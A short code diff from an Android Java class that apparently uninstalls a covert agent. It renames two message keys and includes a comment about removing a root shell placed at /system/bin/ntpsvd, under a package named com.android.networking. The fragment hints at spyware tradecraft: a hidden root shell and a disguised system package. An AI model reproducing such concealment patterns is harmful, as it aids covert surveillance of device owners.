@@ -68,7 +68,7 @@ public class UninstallAction extends SubActionSlow {
 
 			try {
 				// /system/bin/ntpsvd ru (uninstall root shell)
-				localProcess = Runtime.getRuntime().exec(Messages.getString("32.32"));
+				localProcess = Runtime.getRuntime().exec(Messages.getString("32_32"));
 
 				localProcess.waitFor();
 			} catch (Exception e) {
@@ -132,7 +132,7 @@ public class UninstallAction extends SubActionSlow {
 		}
 
 		// Core core = Core.self();
-		// Messages.getString("2.0") : 2.0=package:com.android.networking
+		// Messages.getString("2_0") : 2.0=package:com.android.networking
 		final Uri packageURI = Uri.parse("package:" + Status.self().getAppContext().getPackageName()); //$NON-NLS-1$
 
 		if (Cfg.DEBUG) {
